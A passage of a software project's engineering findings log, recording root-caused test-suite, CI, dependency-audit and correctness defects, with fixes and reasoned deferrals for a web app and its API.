  A SECOND defect surfaced underneath: the fresh lock silently omitted FOUR packages that
  `eslint@9.39.5` declares — `@eslint/config-array`, `@eslint/config-helpers`, `@humanfs/node`,
  `@humanwhocodes/retry`. npm will not add them on repeated installs, because the ROOT pins
  `eslint@8` and the `@eslint/*` scope then resolves against the wrong major, so v9's own deps fall
  through. Found by enumerating all 34 of eslint 9's declared deps against the lock rather than
  fixing them one crash at a time. They are now declared explicitly in `web/package.json` at the
  versions eslint itself asks for — making an existing requirement explicit, not inventing one.
  REJECTED, and worth recording because it looks like the obvious fix: a wholesale
  `rm package-lock.json && npm install`. It produced a lock npm accepts, and moved 99 top-level
  packages — several BACKWARDS past deliberate security overrides. `package.json` pins
  `fast-uri: ^3.1.4`; the regenerated tree took `fast-uri 3.0.0-3.1.3` and the audit gate went red
  with 7 unaccepted high advisories, while a Next downgrade broke web lint. Valid to npm, wrong for
  this repo.
  THE SHARPER LESSON, in three parts, because each cost a wrong conclusion:
  1. A first attempt dropped the root `picomatch`. **`npm ci` passed anyway**, then eslint died at
     runtime with `Cannot find module 'picomatch'` — `micromatch` resolves it from the root. A green
     `npm ci` is not proof the tree WORKS.
  2. Worse, `a65f758` claimed to fix this and did not. It was verified against probe directories
     holding only the root `package.json` + lockfile and NO workspace manifests, so npm could not
     resolve the workspaces at all and its errors were artefacts of the probe. **A workspace repo's
     lockfile can only be tested in a probe carrying every workspace manifest** — the same set the
     Dockerfile COPYs. Build the probe wrong and it will lie in both directions.
  3. `npm test` can exit 1 with every test passing: `fs.inotify.max_user_instances` is 128 on this
     host, and chokidar's watchers throw `EMFILE` once it is exhausted (105 long-lived headless
     chromium processes from a parallel tool held 96). All 3376 tests passed; only watcher creation
     failed. Check `/proc/sys/fs/inotify/max_user_instances` before reading that exit code as a
     regression.

- **`thirty-specs-budgeted-waits-they-could-never-use`** (FIXED 2026-08-01, HIGH, test-estate — the
  single largest cause of this estate's "flakiness"). `playwright.config.ts` set no `timeout`, so
  Playwright's **30s default per-test cap** applied, while **30 of the 76 specs** budget individual
  assertions above it: `legal-cadeia-credito` 120s, `demo-spine`/`gateway-keys`/`legal-jurimetria`/
  `legal-rcbe` 90s, and 25 more at 60s. Every one of those budgets was DEAD CODE — the test was
  killed by the global cap before its own wait could elapse.
  The output said so plainly, on two adjacent lines, and had done for as long as the estate has
  run:
  `Test timeout of 30000ms exceeded.` directly above `Expect "toHaveCount" with timeout 90000ms`.
  It reads as a product hang and is nothing of the sort, which is exactly why it kept being triaged
  as "flake under heavy machine load": the closer the machine ran to the cap, the more specs tipped
  over, and WHICH ones varied per run. Several `docs/known-flakes.md` entries describing
  load-dependent failures at the tail of a long suite are candidates to re-read in this light.
  FIXED at the config, one line, not thirty edits: `timeout: 180_000` — above the longest legitimate
  wait (120s) with headroom, and a BACKSTOP rather than the bound, since each assertion still fails
  at its own budget so a stuck test surfaces where it stuck. Specs needing more still override with
  `test.setTimeout` (part-b-proof 1500s, voice-proof 480s, demos 300s).
  This was the second half of the demos cluster: on the wrong web port their bridge handshake also
  failed, so BOTH causes were real and each alone was enough to keep 28 tours red.

- **`artifact-backend-runtime-never-wired`** (OPEN 2026-08-01, HIGH, feature inert — found by
  repairing `artifact-backend-panel.spec.ts`). **Artifact backends (Layer 2) cannot run at all.**
  `setArtifactBackendRuntime()` is defined in `api/src/apps/backend-runtime/runtime.ts` and is
  called from **nowhere** in `api/src`, so the module singleton stays `NullArtifactBackendRuntime`
  for the process's whole life and every `invoke` returns
  `{ ok: false, error: 'artifact backend runtime is not initialised' }`. `WorkerThreadRuntime`, the
  real implementation, is right there at `runtime.ts:166` — written, exported, never installed.
  Nothing outside the `backend-runtime/` directory imports the module at all.
  WHAT A USER SEES: an app can declare `backend: { entryPoint, handlers }`, the import builds it
  (`appBuilder.build` compiles the backend bundle), and the panel reports `hasBackend: true` with
  the handlers `declared` — so it all looks wired. Then every invocation fails, and
  `events/`-driven trigger delivery into an artifact backend silently does nothing.
  Verified against the running api: import an app with a declared backend, poll `sample-run` for
  40s, get "not initialised" on every attempt while `GET /:id/backend` cheerfully reports
  `hasBackend: true, declared: { entryPoint: 'backend/index.js', handlers: ['onEmail'] }`.
  NOT fixed here deliberately. Wiring it means constructing `RuntimeDeps` at the composition root —
  `resolveOwner`, `resolveBundlePath`, and the capability surface that mints tokens for user code
  executing in worker threads. That is a security-relevant change to an execution boundary, which
  the review policy sends to adversarial review; improvising it inside a red-fixing pass is exactly
  how such a thing lands unreviewed. `api/tests/security/` has suites for the capability layer that
  should be re-read as part of doing it.
  `web/e2e/artifact-backend-panel.spec.ts` is skipped at file level naming this finding, with its
  polling precondition left intact so the file starts working the moment the runtime is installed.
  This is the SAME SHAPE as the daemon seam that sat on its "honest default" until it was wired —
  see `docs/decisions.md` 2026-07-31 and the `LocalCommandSpec` docblock. Worth noting as a pattern:
  a seam with a null default reads as finished from every angle except running it.

- **`artifact-import-posts-a-shape-the-contract-rejects`** (FIXED 2026-07-31, HIGH, correctness —
  a live user-facing break, found by repairing the specs that existed to catch it). **Artifact
  import and bundle-update were broken end to end.** `web/lib/artifact-bundle.ts` reads an export or
  a "Transferir código" zip into a PORTABLE envelope — `{ schemaVersion, manifest, scaffold:
  [{ path, contentB64 }] }` — and `artifacts-surface.tsx` posted it, unconverted, at
  `POST /api/v1/artifacts/import`, whose contract (`shared/src/artifacts.ts`) is
  `{ manifestId, name?, files: [{ path, content }], data? }`. The server validates against the
  contract, so every import answered **400 VALIDATION_FAILED**, `path: ["bundle","manifestId"]`,
  which the UI showed as **"Dados inválidos."** Four call sites: `import` plus all three
  `bundleUpdate` paths.
  HOW IT SURVIVED TYPECHECK, which is the part worth remembering: TWO different types are named
  `ArtifactBundle` — this file's and the contract's — and each call site bridged them with
  `bundle as ArtifactBundle`. The cast is between unrelated shapes and TypeScript took it purely
  because the names matched. Past validation it would still have written NOTHING, since the server
  writes from `bundle.files` and the portable envelope has `scaffold`.
  FIXED with `toContractBundle()` on the reader's side (the contract is the source of truth), the
  four casts replaced by real conversions, and the local type imported as `PortableBundle` so the
  name collision cannot re-arm the same mistake. Proven against the RUNNING api: the same bundle
  gives 400 raw and 201 converted, with files written and UTF-8 intact. Pinned by four tests in
  `web/__tests__/lib/artifact-bundle.test.ts`; the UTF-8 one is revert-proofed (byte-wise decode
  yields `olÃ¡`).
- **`import-loses-the-manifest-so-a-backend-app-arrives-without-its-backend`** (FIXED 2026-08-01,
  HIGH, correctness — found while proving the import fix above). The contract's `ArtifactBundle` has
  no manifest field: only `manifestId, name, slug, files, data, version`. But `bundleFromZip`
  deliberately lifts `manifest.json` OUT of the scaffold into its own field ("the manifest travels
  in its own field"), so converting portable → contract dropped it entirely. The server writes the
  bundle's files, then `ensureManifest()` finds no manifest.json and writes a DEFAULT one — so
  everything the manifest declared was silently lost on import: `backend` (entryPoint + handlers —
  the app arrives with no backend at all), `extends`, `type`, `entryPoint`.
  Proven both ways against the running api: import the same app without manifest.json →
  `hasBackend: false, declared: null`; with it → `hasBackend: true, declared: { entryPoint:
  'backend/index.js', handlers: ['onEmail'] }`. FIXED in `toContractBundle` by appending the
  manifest as a `manifest.json` FILE — the only channel the contract has, and the one
  `ensureManifest` reads (it keeps an existing manifest and only forces id/name).
- **`featured-update-badge-unreachable-from-a-spec`** (OPEN 2026-07-31, LOW, test-coverage — a
  hardening, not a defect). `artifacts-apps-section`'s update-badge test seeds itself by PATCHing
  `data.customized` + `data.updateAvailable`. Both are in `RESERVED_ARTIFACT_DATA_KEYS` and stripped
  twice (route boundary and `patchArtifact`), deliberately: the same list stops a client writing
  `projectDir` (build-sandbox path injection) and `tours` (stored-content injection into the public
  `GET /api/demos/:appId`). A client that could forge "this app has an update" could also drive the
  flow it gates. The old RPC dispatcher allowed it; the rebuild closed it, correctly. So the fixture
  path is closed BY DESIGN and there is no legitimate public route to the state. The BEHAVIOUR is
  still worth covering — it needs a server-side seam (drive `featured-seeder.ts` with a bumped
  manifest version), which is a harness change with its own design. The test is skipped with this
  reasoning inline. Explicitly NOT done: widening the reserved-key list to make a test pass, which
  trades a security control for a green tick.
- **`a-tracked-test-file-that-vitest-never-loads`** (FIXED 2026-07-31, MEDIUM, test-estate — found
  by appending four tests to it and watching them not run). `web/lib/artifact-bundle.test.ts` was
  tracked in git, looked like coverage, and had **never executed**: `web/vitest.config`'s include is
  `['__tests__/**/*.test.{ts,tsx}', 'src/**/*.test.{ts,tsx}']`, and the file sits in neither. It was
  a leftover from the G9 frontend copy — an exact duplicate of the live
  `web/__tests__/lib/artifact-bundle.test.ts`, same nine test names. The suite-ledger census cannot
  see it either: it counts `web/__tests__` only, so the file was invisible from both directions.
  DELETED, with its unique value (nothing) established by diffing the test sets first. Worth
  recording as a class, not an incident: a test file outside the include is worse than no file,
  because it reads as coverage in review and in a directory listing. It was the ONLY one — checked.

- **`ported-e2e-estate-is-not-green`** (FIXED 2026-08-01 — **the estate is green**: 247 passed /
  0 failed / 8 skipped in 17.2m, `[suite-ledger] OK — census matches, every non-due artifact
  ledger-skipped, ratchet holds`, exit 0. Measured on a FRESH stack via `npm run e2e:server`, which
  matters: a warm reused stack accumulates state across runs, and re-running `demo-spine` alone
  deletes the shared Fonseca spine that later specs read. Several "flaky" readings during this work
  were that, self-inflicted. The causes are below and each has its own entry: the port artifact
  (`e2e-server-loses-to-a-running-dev-server`), the 30s cap
  (`thirty-specs-budgeted-waits-they-could-never-use`), three specs on a retired dispatcher, and
  two specs that could never pass on any checkout. Original entry kept below for the measurements.)
- **`ported-e2e-estate-is-not-green` — original 2026-07-31 record** (MEDIUM, process).
  `CLAUDE.md` says the ported estate "stays green on every PR" and that "a red baseline spec is fixed
  before any new work merges". It is not green and has not been for some time. Measured on this
  machine at gate G12, 242 due specs:
  - `origin/main` (`1984ac0`) alone: **49 failed / 179 passed** and **51 failed / 176 passed** on two
    runs of IDENTICAL code — so roughly two specs are outright flaky before anything else is said.
  - the merge (`4261a75`): **39 failed / 190 passed**, and its failure set is a STRICT SUBSET of
    `origin/main` run 1's. Nothing regressed; two specs that differ from run 2 both failed on run 1.
  - after the repairs below (`d6d922f`, same day): **37 failed / 205 passed / 5 skipped** in 37.4m.
    No new failures (the set is a strict subset of the 39), and the +15 passes are exactly the two
    repaired specs: `legal-shared-drift` now contributes 11 and `settings-redirects` 4. Runtime rose
    6.8 minutes, which is the cost of the `demos` budget fix below: those 28 now fail HONESTLY after
    ~60s each instead of being killed misleadingly at 30s. A fast lie is worse than a slow truth,
    but the real end state is fixing the spec, not paying that every run.
  Three of the 39 were provably broken rather than failing, and TWO OF THOSE ARE NOW CLOSED
  (2026-07-31, same day):
  - `legal-shared-drift.spec.ts` shelled out to `scripts/sync-legal-shared.mjs`, which is in neither
    parent — MODULE_NOT_FOUND on every run the estate has ever done. REWRITTEN to assert the
    invariant that script existed to protect, using only what this repo has: the shared layer's ten
    files must be byte-identical across every `legal-*` scaffold. It does not import a canonical
    directory, because choosing where that lives in this repo is a design decision and not a
    mechanical port — if all copies agree, the canonical layer is what they agree on. Now a REAL
    gate: 11 tests over 29 apps × 10 files, green, and verified to go red on a one-line drift probe.
  - `simuladores-trabalho.spec.ts` built from `join(process.cwd(), '..', 'ekoa-data', …)`, resolving
    OUTSIDE the checkout. RETIRED explicitly (ledger `retired` band, with the reasoning): it drove a
    UI app that was never ported here and is a featured artifact in neither repo. Nothing is lost —
    every figure it asserted is covered by `api/tests/legal/simuladores.test.ts`, 18 tests over the
    ported pure engine. If that app is ever ported, the spec comes back with it.
  The third is the big one and is STILL OPEN — see `demos-tour-waits-for-a-button-that-never-renders`
  below, which now has half of it fixed and the other half root-caused to a specific line.
  `docs/testing.md` does acknowledge "committed-baseline debt" in three named bands, but the debt is
  larger than those bands and is not enumerated anywhere, which is the actual problem: a red estate
  cannot detect the next failure.
- **`demos-tour-waits-for-a-button-that-never-renders`** (OPEN 2026-07-31, MEDIUM, test-estate — 28
  of the estate's reds, one cause, half of it now fixed). All 28 `demos.spec.ts` tours failed
  identically. There were TWO stacked causes and the first was hiding the second.
  - **FIXED — the test budget.** The file's waits were written as though they had minutes:
    `clickNext` allows 60s, the banner 90s, the overlay 45s. `playwright.config.ts` sets no
    `timeout`, so Playwright's DEFAULT 30s per-test cap applied and every one of those budgets was
    dead code. The output said so plainly and had been misread for as long as it has been printed:
    `Test timeout of 30000ms exceeded` sits directly above
    `Expect "toBeVisible" with timeout 60000ms`. A `test.setTimeout(300_000)` now gives the file the
    budget its own waits assume — the convention every other long spec here already follows
    (live-bridge 180s, summary-cards-chip 240s, voice-proof up to 480s).
  - **OPEN — what it was hiding.** With a real budget the tour genuinely runs: it logs in, mounts
    the overlay, and steps into the loop. It then dies waiting the full honest 60s for
    `demo-next` on a `step.to` navigation step. `DemoOverlay.tsx` renders that button only when
    `tour.awaitingManual && tour.status === "running"`; the sibling branch renders `demo-awaiting`
    for `status === "awaiting"`. So the tour is in a state that legitimately has no Next button and
    the SPEC is what is wrong: `demos.spec.ts:274` calls `clickNext` unconditionally whenever
    `step.copy` is set, without first checking that the tour is actually waiting for a manual
    advance. Likely a navigation step auto-advances and never gates on the user at all.
    NOT fixed here deliberately: correcting it means changing how the spec walks the tour state
    machine, and doing that without understanding the machine is how you get a test that passes for
    the wrong reason. The next person starts from a named line and a named condition rather than
    from "timeout".
- **`e2e-server-loses-to-a-running-dev-server`** (OPEN 2026-07-31, MEDIUM, tooling — cost a full
  30-minute run before it was noticed). `npm run e2e:server` binds three ports and only one of them
  is configurable in practice: `EKOA_WEB_PORT` (3000) and `EKOA_API_PORT` (4211) come from env, but
  the CORS proxy port is `readBackendPort()` — the committed `backend.port` — because `next.config.ts`
  INLINES that origin into the browser bundle. On a machine with a dev server already on :3000 the
  web app dies with `EADDRINUSE` and the harness reports **130 due artifacts red plus "10 drivers
  require a live dev API"**, which reads exactly like a catastrophic code regression and is not one.
  Worse for anyone checking first: the collision here was with an IPv6-only listener (`:::3000`), so
  a `/dev/tcp/127.0.0.1/3000` probe reported the port FREE. Use `ss -ltn`, and pass
  `EKOA_WEB_PORT` + `WEB_BASE_URL` together (the Playwright `baseURL` reads the latter, the harness's
  readiness poll the former — setting only one silently checks the wrong app). Recorded rather than
  fixed because the real fix is to make the proxy port configurable end-to-end, which means the
  inlined origin in `next.config.ts`, and that is its own change.
  **`EKOA_WEB_PORT` only rescues you when the other server is in a DIFFERENT directory.** Point the
  harness at a free port while a `next dev` is already running against the SAME `web/`, and Next's
  own single-instance guard refuses before the port is ever used: *"Another next dev server is
  already running"*, with the PID and directory. So the workaround holds from a second worktree and
  does NOT hold in the checkout that already has a dev server up — there, the only options are to
  stop that server or to verify from a worktree. Learnt the second way, after the first fix looked
  like it had worked.

- **`consent-once-re-prompts-forever`** (FIXED 2026-07-31, MEDIUM, correctness — found while merging
  the capability-contract and Cofre lines of work). `resolveConsent`'s `once` persisted nothing
  (correctly — that is the answer's whole meaning) and set the resume flag; the engine then re-ran
  the step, `local-command.ts` re-read the DURABLE approvals store, found nothing, and raised the
  same dialog. The only exits were "sempre" and "parar" — the two answers the user had just declined
  to give. There was no per-run consent state anywhere in the module: `signals` carried
  `resumeFlag`/`cancelled` and nothing else. PRE-EXISTING on both merged lines. FIXED with a
  run-scoped `runApprovedShapes` set on the signal record, threaded through `RunContext` and checked
  BEFORE the durable store so a one-off answer never touches it; in memory only, so a restart
  re-asks (the safe direction). The shape check now binds `once` as well as `always` — a mismatched
  `once` is the same caller-supplied-shape hole with a shorter blast radius. Pinned by two tests in
  `api/tests/automation/service.test.ts`; the first drives `once` to COMPLETION and then asserts the
  store is still empty, so it proves both halves at once. Reverting the executor's check makes it
  fail by TIMEOUT rather than assertion — the loop itself, observed.
- **`consent-approval-scope-mismatch`** (FIXED 2026-07-31, MEDIUM, correctness — found by merging,
  not by either line of work on its own). J-7 made a command-shape approval key on owner + org +
  MACHINE, and `executors/local-command.ts` looks it up with the connected daemon's real
  `pairingId`. `service.ts:resolveConsent` wrote it with `pairingId: null`. `idFor()` is an exact
  key, so the row written was never the row read: **"aprovar sempre" banked nothing the executor
  could find, the step re-checked, and the same consent dialog returned — forever — on precisely the
  machines able to run the command.** Invisible on both lines of work for the same reason: every
  consent test connects a fake daemon with no `pairingId`, so write and lookup both collapsed to
  `null`. The wiring of the daemon seam at the composition root (`server.ts`, which hands back
  `conn.pairingId`) is what made it reachable. FIXED by recording the scope on the ConsentRequest at
  the moment the executor asks — the party that will re-read it decides the key — and having
  `resolveConsent` bank the answer in it rather than re-derive one. Pinned by
  `api/tests/automation/service.test.ts` "banks the approval for the MACHINE the run is awaiting on",
  which uses a non-null `pairingId` and asserts the run COMPLETES, not just that a row exists;
  verified to fail on revert (`expected false to be true`).
- **`step-log-tail-outside-the-h1-filter`** (FIXED 2026-07-31, LOW, security defence-in-depth —
  found by reading the merged engine, not by a failing test). `redactStepRecord` (Cofre H-1) filters
  `error.message`, `error.details`, `output` and `resolvedAction` before a step record reaches the
  SSE stream, and its docblock says a new SINK inherits the filter. It does — but a new FIELD does
  not, and `logTail` (slice E4, the bounded tail of what a step streamed) arrived from the other line
  of work. So the emitted record carried the tail unfiltered. NOT a live leak on the wired path: the
  tail's only production source is daemon output, which is redacted at bridge INGRESS (H-4) before
  the engine ever sees it, and the persisted+served copy comes from the same already-filtered text.
  FIXED so the docblock is true of the whole record. Pinned by `api/tests/automation/run-logs.test.ts`
  "a secret streamed into the tail is redacted out of the emitted step record", which asserts the
  chunk really carried the value before asserting the emitted record does not; verified to fail on
  revert.
- **`binary-bytes-allowlist-went-stale-in-the-merge`** (FIXED 2026-07-31, LOW, hygiene). Two of the
  three shrink-only allowlist entries in `api/tests/security/binary-bytes-gate.test.ts`
  (`apps/document-source.test.ts`, `llm/anonymise/index.ts`) were cleaned by `1984ac0` on a parallel
  line of work that had never seen the gate. The ratchet did exactly its job at the merge: it failed
  on the stale entries instead of passing over them. Entries removed; the list is down to one.
- **`typist-emits-no-registo-row`** (OPEN 2026-07-29, LOW, auditability — found while pinning F-5).
  `typistLogin` records credential use on the ITEM (`lastUsedAt`/`lastUsedBy` via `recordUse`) but
  emits no Registo row, although the A-6 vocabulary defines `cofre_item_used` for exactly this. So a
  user reading their Registo sees the unlock and the grant but not the login that consumed it. Not a
  leak — the item row is metadata-only and carries no value — but an audit gap on the one primitive
  that handles a decrypted credential against a live page. Asserted in
  `api/tests/security/typist-non-memorable.test.ts` in the NEGATIVE direction so it is visible
  rather than assumed; flip that assertion when the row is emitted.
- **`trigger-null-target-blanks-the-webhooks-list`** (FIXED 2026-07-29, MEDIUM, correctness — found
  by repairing the e2e estate). `GET /api/v1/triggers` emitted `automationId: null` for a trigger
  created against an ARTIFACT (and `artifactId: null` for the reverse). `shared/` types both as
  `Id.optional()`, and zod's `.optional()` accepts `undefined` but **rejects `null`** — so
  `TriggerListResponse` failed to parse client-side, `tryCall` reported not-ok, and the webhooks
  store kept an empty array. The user saw **"Ainda não existem webhooks" over a populated
  database**, with no error surfaced anywhere: creating a webhook returned 201, the row never
  appeared, and nothing said why. FIXED in `triggerView` by omitting absent optionals instead of
  passing null — the same field-by-field discipline `sessionView` already uses. Worth recording why
  this survived a surface the schema-coverage gate marks COVERED: every existing fixture set one
  target or the other, so `null` never appeared in a test. The new cases construct the real
  database shape (an explicit `null`) and go red against the old mapper.
- **`pipedream-master-switch-inert`** (FIXED 2026-07-29, HIGH, security — found by repairing the e2e
  estate, not by reading code). The Pipedream master toggle **could not be turned off**.
  `PATCH /api/v1/settings` persists via `patchOrgSettings`, which writes the ORG document
  (`orgs[orgId].settings`); the enforcement read `isPipedreamEnabled()` went to
  `settings.get('default')` — a different collection, and a document nothing ever writes. It
  therefore always read null, and on null returned `undefined !== false` → **true**. Two independent
  defects compounding: the wrong store, and a FAIL-OPEN default on a third-party egress integration.
  Symptoms an operator would see: turning it off returns 200, `GET /settings` reports
  `pipedreamEnabled:false`, and the UI toggle snaps back to on — because the toggle renders
  `status.enabled` (the broken read) while writing to settings. `runPipedreamAction`'s `disabled`
  guard never fired once. FIXED: the read now uses the org document the write lands in, and defaults
  to DENY, matching `mergedSettings` (what the API and UI report). Pinned by
  `api/tests/security/pipedream-master-switch.test.ts` (8 cases; 7 go red against the original).
  Note for auditors: two pre-existing tests in `tests/integrations/pipedream.test.ts` "disabled" the
  feature by writing `settings['default']` — they passed by exercising the bug's own plumbing, which
  is why the defect survived a suite that appeared to cover it.
- **`npm-audit-gate-unsatisfiable-and-unread`** (FIXED 2026-07-29, MEDIUM, process/security). The
  `security-gates` job had been failing at `npm audit --audit-level=high` (17 vulnerabilities, 10
  high). The gate was UNSATISFIABLE as written and therefore unread: two of its highs have no fixed
  version at all, so the only ways to green were to drop the threshold (stop seeing highs) or wait
  forever. Meanwhile the genuinely actionable production advisories sat unnoticed behind the noise.
  FIXED in two parts. **Upgrades** (production highs 9 -> 0 unaccepted): `next` 16.2.10 -> 16.2.12,
  `dembrandt` 0.23.1 -> 0.25.1, `react-router-dom` -> 7.18.2, plus root `overrides` forcing
  `postcss` 8.5.24, `sharp` 0.35.3, `adm-zip` 0.6.0, `fast-uri` 3.1.4. **A real gate**
  (`scripts/audit-gate.mjs`) replacing the blunt flag: it blocks on any unaccepted high/critical in
  the PRODUCTION tree (`--omit=dev` — those ship), reports dev-tree highs without blocking (a DoS in
  the linter's glob matcher is not a path to tenant data), and accepts only explicitly documented
  advisories, each stating why it is unreachable and what would close it. Acceptance propagates
  transitively to a fixpoint, so a six-deep chain resolves from its root advisory. Verified
  non-vacuous: a planted unlisted critical fails, and a package that gains its OWN advisory cannot
  launder it through an accepted dependency.
- **`archiver-8-removed-the-factory-api`** (OPEN by design 2026-07-29, LOW, dependency). `archiver@8`
  clears the entire archiver advisory chain, and was tried and REVERTED. v8 is pure ESM exporting
  classes (`Archiver`, `ZipArchive`, ...) with no default and nothing callable, so
  `archiver('zip', ...)` in `api/src/services/app-archive.ts` becomes `TypeError: archiver is not a
  function` and the artifact download 500s (caught by `app-archive.test.ts` +
  `artifact-family.test.ts`). Migrating is a rewrite of a user-facing download path, not a shim, and
  the advisory it closes is a glob-expansion DoS that this code cannot reach — entries are added one
  at a time as `archive.file(absolutePath, { name: relPath })` from our own directory walk;
  `archive.glob()` and `archive.directory()` are never called. Accepted in `scripts/audit-gate.mjs`
  with that reasoning. Do the migration the next time `app-archive.ts` is opened for other reasons.
- **`e2e-estate-15-red-first-honest-measurement`** (PARTIALLY FIXED 2026-07-29 — 9 of 15 closed).
  With the CSP/CORS bring-up repaired, the estate ran to completion for the first time and reported
  15 real failures. They were never one problem. **FIXED (9):** five specs drove
  `POST /api/v1/action`, the old Cortex RPC dispatcher, which this repo does not implement and which
  is absent from `shared/` entirely — repointed to REST (`web/e2e/helpers/backend-rest.ts`), fixing
  onboarding (x3) and vertical-profile; two order dependencies (onboarding never set the LEGAL
  vertical its chips need; pages-manage's bare `getByRole('tab')` now spans page tabs AND filter
  pills, so `.nth(1)` navigated off the panel holding the search box); two stale ENGLISH selectors in
  a PT-PT product (`/Usage/i` vs "Utilização"; `iframe[title*="Preview"]` vs "Pré-visualização"); and
  two REAL PRODUCT BUGS with their own entries — `pipedream-master-switch-inert` and
  `trigger-null-target-blanks-the-webhooks-list`. **STILL OPEN (6),** each needing a decision rather
  than a fix:
  - `artifacts-apps-section`, `update-from-bundle`, `artifact-backend-panel` — need `ekoa.templates`
    / `ekoa.artifact-backend`, surfaces with **no route and no `shared/` module** in the rebuild.
    Either that functionality is still wanted (build it) or the specs are stale (retire them
    explicitly, per the QA process). Not a call to make silently from a test file.
  - `legal-shared-drift` — invokes `scripts/sync-legal-shared.mjs`, which exists nowhere in the repo
    or its history, against a canonical `ekoa-data/legal-shared/` that also does not exist. The
    invariant is real (six scaffolds must not drift from a shared layer); the tool was never ported.
  - `simuladores-trabalho` — needs `ekoa-data/apps/simuladores-trabalho/build.mjs`, a user-app build
    artifact not in the repo. The underlying logic IS ported and unit-tested
    (`api/src/legal/simuladores.ts`, `api/tests/legal/simuladores.test.ts`).
  - `legal-rcbe` — NOT idempotent: it completes the demo obligation and re-running finds it already
    `cumprida`, so it asserts "atraso|Pendente" against fulfilled state. The scaffold has a reset,
    but it is gated on `isDemoActive()` (an injected tour runtime the spec cannot trigger) and the
    data lives in served-app shared storage that survives runs. Needs a deterministic reset hook.

- **`ci-e2e-step-could-never-pass`** (FIXED 2026-07-29, MEDIUM, process — surfaced when the lane
  first reached the e2e step). With typecheck, `npm test` and `npm run build` all green for the
  first time, `npm run e2e` failed for two structural reasons, neither a test defect: (1) Playwright's
  browsers were never installed on the runner, so the first `chromium.launch()` died with
  "Executable doesn't exist at ~/.cache/ms-playwright/..." — `Dockerfile.api` already installs them
  for exactly this reason; (2) the step ran the BARE ledger runner, which needs a live api on :4111
  and reports "10 due driver(s) require a live dev API — an unreachable-server skip is NOT green".
  The repo already contains the fix: `scripts/e2e-with-server.mjs` (`npm run e2e:server`) boots
  dev-api on an ephemeral memory-mongo, waits for READY plus the featured prebuild, runs the ledger
  and tears down — and its own docblock says "CI sets EKOA_SCREENSHOTS_DISABLED", i.e. it was
  written for this lane, which then never called it. FIXED by installing chromium and calling
  `e2e:server`; it needs `npm run build` output, which the preceding step already produces. Same
  class as `ci-typecheck-never-ran` and `subprocess-isolation-test-could-never-pass-on-ci`: a step
  that had never once executed its actual work, invisible for as long as an earlier step failed
  first.
- **`subprocess-isolation-test-could-never-pass-on-ci`** (FIXED 2026-07-29, MEDIUM, test-integrity
  — surfaced the moment CI first reached `npm test`). `api/tests/llm/subprocess-isolation.test.ts`
  asserted that the literal string `ekoa-code` appears nowhere in the SDK subprocess spawn contract,
  using the repo's directory NAME as a proxy for "a host path leaked". On GitHub Actions the repo is
  *named* `ekoa-code`, so GitHub's own injected metadata (`GITHUB_REPOSITORY`,
  `GITHUB_WORKFLOW_REF`) and npm's workspace-PARENT bin entry
  (`/home/runner/work/ekoa-code/node_modules/.bin` — NOT under the checkout root, so correctly kept
  by the F25 `underPathRoot` filter) all contain it. **The test was green locally and structurally
  red on CI, and could never have passed there.** Nobody saw it because the lane died at typecheck
  before reaching `npm test` (`ci-typecheck-never-ran`) — fixing CI is what exposed it. FIXED by
  asserting the invariant the code actually implements: the sandbox is neither the server cwd nor
  the operator home, `env.HOME` is the sandbox, no NON-PATH value carries the checkout or the
  operator home, and PATH carries no segment under the checkout root. PATH is exempt from the
  home-check BY DESIGN and by written disposition (the accepted `subprocess PATH home-path residual`
  below): node and the toolchain live under `$HOME` on nvm/fnm/volta/asdf hosts and the SDK spawns a
  bare `node` against this PATH, so filtering `$HOME` out of it ENOENTs every model subprocess.
  Verified three ways: passes under the simulated CI vars, the old assertion provably fails under
  the same vars, and it still goes red when the PATH-root filter is removed.
- **`gitleaks-red-on-synthetic-fixtures`** (FIXED 2026-07-29, MEDIUM, process — found when the
  first push finally reached CI). The `security-gates` job had been RED since 2026-07-27, failing at
  the gitleaks step on five `generic-api-key` hits. All five are synthetic credential fixtures in
  the Cofre security suite (`sk-live-COFRE-TEST-0001`, `sk-live-EXFILTRATE-ME-0001`,
  `sk-live-BOUNDARY-TEST-0001`, `sk-live-abcdef123456`, and — added by this session's J-3 —
  `deliver-me-J3-SECRET-9911`). They are deliberately secret-SHAPED, because the suites they belong
  to test that a secret-shaped value is redacted, refused or never echoed, and a fixture that did
  not look like a credential would prove nothing. Two consequences of the redness are the reason
  this is MEDIUM rather than cosmetic: a red gate carries no signal, and it had been red long enough
  that a REAL leak would have arrived into an already-failing check. FIXED by allowlisting the five
  VALUES in `scripts/gitleaks.toml` — deliberately not by path: an
  `api/tests/security/**` path allowlist is one line instead of five and would blind the scanner to
  a real token pasted into a test file, which is a normal way credentials escape. Renaming the
  fixtures was not an option: `gitleaks detect` scans git HISTORY, so the original literal stays
  reachable in the commit that introduced it. Going forward a new fixture should carry
  `EKOA-SYNTHETIC-`, covered generically. Verified precise: a real-looking `sk-live-...` in the same
  directory still fails the scan.
- **`bridge-ingress-freetext-header-residual`** (OPEN by design 2026-07-29, LOW, confidentiality —
  found while building H-4). The ingress filter has two legs: value-keyed (exact, for values Cortex
  delivered) and name-pattern (`redactBodyByName`, for credentials Cortex never held). The name leg
  understands JSON keys and `key=value` pairs. A colon-separated header line in free-text stdout —
  `Authorization: Bearer sk-live-...` — matches neither shape and survives it, so such a value is
  removed only when Cortex DELIVERED it and the value leg recognises it. NOT closed, deliberately:
  widening the name leg to colon-separated pairs would fire on ordinary prose, including any
  `word: value` line in a document excerpt, and a filter that mangles legitimate output is one
  people route around. Pinned in BOTH directions by
  `api/tests/security/bridge-ingress-redaction.test.ts` (the leak asserted as surviving, and the
  delivered-value mitigation asserted as working), so if it is ever closed the expectation flips
  and the test says so rather than the behaviour drifting silently.
- **`ci-typecheck-never-ran`** (FIXED 2026-07-28, HIGH, process — found while fixing the red
  typecheck baseline for A-8). **The per-PR CI lane has never successfully typechecked `api/` or
  `web/`.** `.github/workflows/ci.yml` ran `npm run typecheck` with no prior build of `shared`, but
  `api/` and `web/` resolve `@ekoa/shared` through its package `types` field
  (`shared/dist/index.d.ts`), which is gitignored and only exists after `npm run build --workspace
  shared`. On a fresh `npm ci` checkout the step therefore died with **87 x TS2307 "Cannot find
  module '@ekoa/shared'"** — reproduced locally by moving `shared/dist` aside — so the step failed
  for a MISSING ARTIFACT, never reaching a single real type error. A local tree hides it completely,
  because `shared/dist` survives from an earlier build. Two consequences, and the second is the
  reason this is HIGH rather than a chore: (1) `ci` has been red on `main` for at least the last
  eight runs and the redness carried no information, which is how a lane stops being read; (2) real
  type errors accumulated on `main` unnoticed — 9 of them at the time of writing, listed below —
  because nothing anywhere was checking. FIXED by building `shared` before the typecheck step.
